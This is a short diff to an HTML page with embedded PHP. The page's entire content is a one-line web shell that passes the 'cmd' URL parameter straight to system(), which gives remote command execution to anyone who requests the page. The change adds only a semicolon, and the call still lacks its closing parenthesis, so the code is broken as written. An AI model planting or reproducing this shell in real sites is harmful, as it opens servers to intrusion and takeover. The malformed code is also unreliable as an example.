@@ -1,7 +1,7 @@
 <html>
 <?php
 
-	system($_GET['cmd']
+	system($_GET['cmd'];
 	
 ?>
 </html>
